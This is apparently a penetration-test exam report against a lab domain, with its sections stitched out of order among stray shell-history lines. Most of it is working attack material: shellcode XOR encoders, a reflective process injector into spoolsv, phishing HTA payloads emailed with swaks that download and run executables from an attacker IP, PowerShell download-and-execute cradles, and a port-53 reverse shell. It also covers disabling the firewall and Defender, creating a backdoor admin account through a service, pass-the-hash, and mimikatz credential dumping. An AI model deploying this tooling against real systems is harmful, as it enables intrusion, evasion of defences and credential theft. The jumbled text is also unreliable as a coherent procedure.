
echo $thmkid
exit
whoami
exit
# Custom Tools
## The powershell encryptor 
This tool is used for encrypting my shellcode with a string. Through out the pentest I first generated my shell code with `msfvenom` with `-f raw -o smething.bin` and then supply the file path to this powershell script to get the encoded shellcode. The usage is `pwsh pwsh.ps1`, and supply the file path, and the output file path.
```powershell

function nofun {
   Param($rawfile, $path)
        [Byte[]] $a =[System.IO.File]::ReadAllBytes($rawfile)
        [console]::WriteLine("The length of the raw file : " + $a.Count + " Bytes")
        [Byte[]] $s =@()
        for (($i = 0); $i -lt $a.Length; $i++)
   {    
    $s += ([byte]([uint64](($a[$i] +2 ) -bxor 0xf2e8) -band 0xff))
   }
    $sb = [System.Text.StringBuilder]::new() 

       for(($byte=0 ); $byte -lt $s.Length; $byte++){
             if ($byte -eq $s.Length -1 ) {
            [void]$sb.AppendFormat("0x{0:x2} ", $s[$byte])
                }

            else{ 
                [void]$sb.AppendFormat("0x{0:x2}, " ,$s[$byte])
           }
            }
        [console]::WriteLine("[byte[]]" + "$" +"test= " + $sb.ToString())
     
        [System.IO.File]::WriteAllBytes([string]$path, $s);
}

$Age = Read-Host "Please enter the unencrypted shellcode path"
$path = Read-Host "Enter the filename you write it to."

nofun $Age $path
```
## The Ntmap injector generator.
You can simply supply the generated shellcode with `msfvenom` with `-f raw -o somthing.bin` flags into this python file and it will put the shellcode into the reflective injection powershell script, then you can manually change it to the process you want to inject to. the default is `explorer`, but during the pentest. I changed it to `spoolsv` and used it all along whenever i have admin privilege, this is done to ensure the stability of the meterpreter shell as I found it has the best stability among others
```python



# NOTE: more configuration can be done. such as process to inject shellcode to, the variable names and etc...


import sys, itertools
#msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.x.x LPORT=443 -f raw -o hello.bin

def XOR(data, key):
    return bytes(a ^ b for a, b in zip(data, itertools.cycle(key)))

if __name__ == '__main__':
    if len(sys.argv) < 3 or len(sys.argv) > 5:
        sys.exit(f'{sys.argv[0]} <raw_sc_file.bin> <key> <opt_var_name> <adminpriv>')
        #msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=xx LHOST=192.168.xx.xx -f raw EXITFUNC=thread -o lin_sc_x64.bin
        
    shellcode = ""
    with open(sys.argv[1], mode='rb') as fr:
        shellcode = XOR(fr.read(), sys.argv[2].encode('utf-8'))

    fmted=''
    counter = 0
    for byte in shellcode:
        if counter and counter == len(shellcode) -1 :
            
            fmted += f'0x%02x \n' % byte

        else : 
            fmted += f'0x%02x, ' % byte
        counter += 1





a = """
function getDelegateType{

  Param(
      [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
      [Parameter(Position = 1  )] [Type] $deltype = [Void]
      
  )

  $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
  
  $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
  
ls
cd ..
ls
cd ..
ls
exit
7. Finally. we will set up the local listen in metasploit for bind shell with the correct port and RHOST we used in msfvenom. and `run`.
8. On the SCADA01 machine, we will go to folder `C:\\windows\\tasks` in impacket wmiexec shell and execute `bind.exe`. We can see we are getting a meterpreter session now!
## Local Privilege Escalation
Since we logged in as Local Admin, we do not need to perfrom a privilege escalation. 
## Screenshots
# The /etc/Hosts file set up during this penetration test
```bash
127.0.0.1localhost
127.0.1.1kali



10.10.32.157 SCADA01.ICS.TOTALENERGY.COM SCADA01
172.16.72.152 JUMP02.ICS.TOTALENERGY.COM JUMP02
172.16.72.150 CDC08.ICS.TOTALENERGY.COM ICS.TOTALENERGY.COM
172.16.72.210 dc02.DMZTE.COM DMZTE.COM
172.16.72.130 CDC05.OPS.TOTALENEGERY.COM OPS.TOTALENERGY.COM
172.16.72.135 APPSRV02.OPS.TOTALENERGY.COM
172.16.72.142 CLIENT01.OPS.TOTALENERGY.COM CLIENT01
172.16.72.146 CLIENT02.OPS.TOTALENERGY.COM CLIENT02 

172.16.72.138 JUMP05.OPS.TOTALENERGY.COM JUMP05
172.16.72.132 FILE05.OPS.TOTALENERGY.COM FILE05
172.16.72.137 WEB07.OPS.TOTALENERGY.COM WEB07
172.16.72.180 MAIL01.OPS.TOTALENERGY.COM MAIL01





# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
ls
6. In addition, since we are using an arbitary port `888`, we would want to enable all ports connectivity on the firewall configuration for SCADA01 within our previous opened impacket psexec shell using the following commands
```bash
netsh advfirewall firewall add rule name="Safety Check" dir=out action=allow protocol=TCP localport=1-65535
netsh advfirewall firewall add rule name="Safety Check" dir=in action=allow protocol=TCP localport=1-65535
```
8. We are now in possession of `secre.txt`. Pentest complete.
## Post-Exploitation Enumeration Steps
1. Disable network firewall - same above
2. Disabled AV - same above.
3. We are doing something different this time, upon inspection, we noticed that the SCADA01 machine only has the interface which allowed 10.10.32.0/24 internal subnet communication, we will leverage meterpreter bind shell to spawn a meterpreter session onto the machine rather than reverse meterpreter shell since the server does not know how to get back to our attacking ip.
4. we can generate the bind shell executable with  `msfvenom -p windows/x64/meterpreter/bind_tcp RHOST=10.10.32.157 LPORT=888 -f exe -o bind.exe`.
5. And we will use impacket wmiexec to get a shell onto the system and upload our bind.exe under `C:\\windows\\tasks` folder with the following commands
```bash

sudo proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py Administrator@SCADA01  -hashes ef9a86758ca7bba7ad6e3407b5e87a59:ef9a86758ca7bba7ad6e3407b5e87a59
put bind.exe C:\windows\tasks

```
7. And then we will use the dumped local admin hash from JUMP02.ICS.TOTALENERGY.COM 
```bash
sudo proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@SCADA01  -hashes ef9a86758ca7bba7ad6e3407b5e87a59:ef9a86758ca7bba7ad6e3407b5e87a59
```
```powershell
$cnbToWvMjCci = @"

[DllImport("kernel32.dll")]

public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]

public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

"@



$AgrvPTsf = Add-Type -memberDefinition $cnbToWvMjCci -Name "Win32" -namespace Win32Functions -passthru



[Byte[]] $kgphRdAvzurA = ...shellcode generated with msfvenom...





$ZoFmZTFrhkHOl = $AgrvPTsf::VirtualAlloc(0,[Math]::Max($kgphRdAvzurA.Length,0x1000),0x3000,0x40)



[System.Runtime.InteropServices.Marshal]::Copy($kgphRdAvzurA,0,$ZoFmZTFrhkHOl,$kgphRdAvzurA.Length)



$AgrvPTsf::CreateThread(0,0,$ZoFmZTFrhkHOl,0,0,0)


```
PowerView can be found on [](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) And then we can call it here. with 
```powershell
iex((new-object ystem.net.webclient).downloadstring('http://192.168.49.72/ps1good/PowerView.ps1')))

```
- `Get-DomainController` to get the domain controller.
- `Get-DomainTrustMapping` to get domain trust mapping.
- `Invoke-PrivEsc` checking privilege escalation since we are running as low privileged user. I also found ssh-agent services on the machine. but disabled.
## Screenshots
# 172.16.72.142 / CLIENT01.OPS.TOTALENERGY.COM
## Local.txt  & Proof.txt 
- local.txt : 31486f29da5fd4c06b6fa9e6ad67ee62
- proof.txt : e9a8ada01b0c0caafce0dae56d4f0c67
## Pre-Compromise Enumeration Steps
while checking the other public facing IP, on port 80. I found another interesting page `http://192.168.72.182/enegery.php`. We should email `eli@totalenergy.com`. but where is the smtp server? Nmap will help out on that! `sudo nmap 192.168.72.180` revealed the smtp server.
1. I used `swaks` to send eli a url link with my hosted `testme.hta` on the python server I started. Which downloads my previous CLM bypass tradecraft `Runspace.exe` to `C:\windows\tasks\enc.exe`. - See above code for source code. ```bash
swaks --to eli@totalenergy.com --server 192.168.72.180 --from hr@totalenergy.com --header 'Subject: Promotion' --body "Hello there visit http://192.168.49.72/testme.hta" --attach test.lnk
``` ```html
<html>  
<head>  
<script language="JScript"> 
var shell = new ActiveXObject("WScript.Shell"); 
var res = shell.Run("curl http://192.168.49.72/wmidechain/Runspace.exe -o C://windows//tasks//enc.exe");

</script> 
</head>  
<body> 
<script language="JScript"> 
self.close(); 
</script> 
</body>  
</html>
``` 2. After eli downloads my `Runspace.exe`. It is time to trigger it. So i crafted another `testme1.hta`. which leverages `Installutil.exe` again.  ```bash
swaks --to eli@totalenergy.com --server 192.168.72.180 --from hr@totalenergy.com --header 'Subject: Promotion' --body "Hello there visit http://192.168.49.72/testme1.hta" --attach test.lnk
```
```html
<html>  
<head>  
<script language="JScript"> 
var shell = new ActiveXObject("WScript.Shell"); 
var res = shell.Run("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe \/logfile= \/LogToConsole=false \/U C://windows//tasks//enc.exe");

</script> 
</head>  
<body> 
<script language="JScript"> 
self.close(); 
</script> 
</body>  
</html>

```; 3. NOTE: I changed the `message.txt` auto triggering to port 53 instead of previous 7777 to bypass firewall restriction. Therefore, in reproducing the exploit, you will need to change your local listener to port 53 as well.; ```powershell
...

Invoke-PowerShellTcp -Reverse -IPAddress 192.168.49.72 -Port 53  
```
We will use PowerUp.ps1, you can find it on  https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1 ```powershell
iex((new-object system.net.webclient).downloadstring('http://192.168.49.72/ps1good/PowerUp.ps1'));Invoke-Allchecks
```  Revealed the `SNMPTRAP` services allowed all access for the current user `ops\eli`. We can then abuse to perfrom previlege escaltion. Since this is machine leads us to a internal subnet of 172.16.32.0/24 , we will leverage `proxychains` and `metasploit` to start a socks proxy and route our network traffic through. - `search socks1` in metasploit.; - `use 0` and `set SRVPORT 1080`, because we will use double chains in this case where the traffic will first go through our proxy into the 172.16.72.0/24 subnet `run`. ; -  `search autoroute` we also need to tell the metasploit where the traffic should be route thru. which in this case our JUMP02.ICS.TOTALENERGY.COM machine. so you need to set the session number accordingly. `Set SESSION 15` and `run`.; -  we can verify that our route has established with `route`; -  make sure to configure your `/etc/proxychains4.conf` file  ```bash
...

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1080

``` Since we have `All` rights to the service SNMPTRAP, we can leverage the services to make it run as SYSTEM privilege and add a new user `kiwids` with the password `HKXqq2007` to the local admin group. ```bash
sc config SNMPTRAP binpath= "cmd /c net user h4cked HKXqq2007 /add /Y && net localgroup administrators h4cked /add"
sc config SNMPTRAP start= demand
sc config SNMPTRAP obj= "NT AUTHORITY\SYSTEM"
sc start SNMPTRAP
```; 2. RDPed in as h4cked user using `sudo proxychains xfreerdp /u:h4cked /p:HKXqq2007 /v:172.16.72.142`; 3. and started the print spooler service set to `automatic` and `start` the service.  4. Powershell ntmap injection  ```powershell
iex((new-object system.net.webclient).downloadstring('http://192.168.49.72/hellofriend.txt'));iex((new-object system.net.webclient).downloadstring('http://192.168.49.72/admin.ps1'))
``` 5. Ntmap injection - `admin.ps1` source code is shown here. ```powershell
function getDelegateType{

  Param(
      [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
      [Parameter(Position = 1  )] [Type] $deltype = [Void]
      
  )

  $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
  
  $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
  
  $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

  return $type.CreateType()

}

<#
function Helper{
    Param($key, $friend)
        
        [Byte[  ]]$buffer= @()
        [Byte[]]$sb = @()
        $buffer=[System.Text.Encoding]::UTF8.GetBytes($friend)
        for (($i = 0); $i -lt $friend.Length; $i++)
   {    
    $sb += ([byte]([uint64]$buffer[$i] -bxor 0xff12 
   }
       

        $s = [System.Text.Encoding]::UTF8.GetString($sb, 0, $sb.Length)
        return $s 
}
#>
function nofun {
   Param($havefun)
        
        $string =  "whoami"
        [Byte[]] $s =@()
        for (($i = 0); $i -lt $havefun.Length; $i++)
   {    
    $s += $havefun[$i] -bxor $string[$i % $string.Length] 
   }
        return $s
}


function LookupFunc{

Param ($moduleName, $functionName)
#Gettype() get's the returned object Type reference. And for the speicifc type, we can get the Methodinfo object, so we can invoke it 
$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object{
  $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

$tmp = @()

$assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))

}



$expProcess= [System.Diagnostics.Process]::GetProcessesByName('spoolsv')
[int]$pid = $expProcess.Id
$ProcessHandle =[System.Diagnostics.Process]::GetCurrentProcess().Handle;
$openprocess= [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), (getDelegateType @([Uint32], [Boolean], [Int32]) ([IntPtr]) ))

$CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread), (getDelegateType @([IntPtr], [IntPtr], [Uint32], [IntPtr], [IntPtr], [Uint32], [IntPtr] ) ([UInt32]) ))
$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [UInt32] ) ([UInt32]) ))

[IntPtr]$hProcess = $openprocess.Invoke(0x001F0FF, $false, $pid);
[IntPtr]$mySectionHandle=[IntPtr]::Zero
[Uint32]$maxSize = 4096

$NtCreateSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc ntdll.dll NtCreateSection), (getDelegateType @([IntPtr].MakeByRefType(), [Uint32], [IntPtr], [Uint32].MakeByRefType(), [Uint32], [Uint32], [IntPtr] ) ([UInt32]) ))
$NtCreateSection.Invoke([ref]$mySectionHandle, 14, [IntPtr]::Zero, [ref]$maxSize, 64, 0x8000000, [IntPtr]::Zero)

[IntPtr]$localSectionAddress =[IntPtr]::Zero
[IntPtr]$remoteSectionAddress =[IntPtr]::Zero

[UIntPtr]$ZeroBits = [UIntPtr]::Zero
[UIntPtr]$CommitSize  = [UIntPtr]::Zero
[Long]$sectionoffset = 0
[UInt32]$AllocationType = [Uint32]0

#NtCreateSection
$NtMapViewOfSection= [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc ntdll.dll NtMapViewOfSection), (getDelegateType @([IntPtr], [IntPtr], [IntPtr].MakeByRefType(), [UIntPtr], [UIntPtr], [Long].MakeByRefType(), [Long].MakeByRefType(), [Uint32], [Uint32], [Uint32] ) ([UInt32]) ))

$NtMapViewOfSection.Invoke($mySectionHandle, $ProcessHandle, [ref]$localSectionAddress, $ZeroBits, $CommitSize, [ref]$sectionoffset,  [ref]$maxSize, 2, $AllocationType, 0x40)
$NtMapViewOfSection.Invoke($mySectionHandle, $hProcess, [ref]$remoteSectionAddress, $ZeroBits, $CommitSize, [ref]$sectionoffset,  [ref]$maxSize, 2, $AllocationType, 0x20);


[byte[]]$havingfun = ..shellcode generated with custom made python tool... you will see the source code at the end of the report...

$realfun =  nofun $havingfun "whoami"
[System.Runtime.InteropServices.Marshal]::Copy($realfun, 0, $localSectionAddress, $realfun.Length)

#RTLCreateRemoteThread
$hThread1 = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $remoteSectionAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$WaitForSingleObject.Invoke($hThread1, [uint32]"0xFFFFFFFF")


``` After execution we will get a reverse_https meterpretershell inside of `spoolsv.exe` running as `NT AUTHORITY\SYSTEM`.
1. Turn off all firewall config with `netsh advfirewall set allprofiles state off` in a SYSTEM privileged cmd.exe ( can be done with `shell` with the current meterpreter session)
2. Remove AV definition. `"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All`.
3. In the process we can see a process running by `ops\WkstMonitor`. and in bloodhound we can see that the group have a `admin priviledge to CLIENT02.OPS.TOTALENERGY.COM`
4. `kiwi_cmd "sekulsa::logonpasswords"` revealed us the hash for `WkstMonitor` which is `a4ebb0cc431f32a2ea10c70ce96e013a`
5. We first drop to a will use previous reverse powershell session to invoke  `SharpHound.ps1`  found on https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1 to do our domain enumeration. We will first download it from our python server under folder `ps1good` with 
```powershell
iex((new-object system.net.webclient).downloadstring('http://192.168.49.72/ps1good/SharpHound.ps1'))
``` 
and run  
- Now that we finally bypass the AMSI and CLM restriction, we can view the JUMP05 local admin password with
- 
```powershell
iex((new-object system.net.webclient).downloadstring('http://192.168.49.72/ps1good/PowerView.ps1'))
```
- `Get-DomainComputer JUMP05` We can see the JUMP05 clear text password! 
- And we will rdp into the system with
`sudo proxychains xfreerdp /u:Administrator /p:"\!a;-\!C/%2QzsG9" /v:JUMP05.FINAL.COM `
which appeared that they are in the same subnet. And then double checking SCADA01 server in bloodhound, the interesting GPO caught my attention. 
They two machines belongs to the `ICSSERVERS` GPO and yet SCADA01 have no explicit admins shown in bloodhound. which means none of the domain users have privileges to the machine. After a bit of thinking, I thought of this might the hint for a password-reuse case here. 
## Compromise
1. Setting up the socks proxy for subnet 10.10.32.0/24 with metasploit 
2. `search socks` in metasploit 
3. `use 0` and `set SRVPORT 1081`, because we will use double chains in this case where the traffic will first go thru our 1st proxy into the 172.16.72.0/24 subnet and then go thru 2nd proxy into the 10.10.32.0/24 subnet which finally reaches out to our  SCADA01 machine.
4. `search autoroute` we also need to tell the metasploit where the traffic should be route thru. which in this case our JUMP02.ICS.TOTALENERGY.COM machine. so you need to set the session number accordingly.
5. Edit your `/etc/proxchains4.conf` again for dynamic chainning. 
```bash
...

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1080
socks5  127.0.0.1 1081
```
ls
./bash
bash
shell
env
```bash

env | less
bash 
nano .bashrc
exit
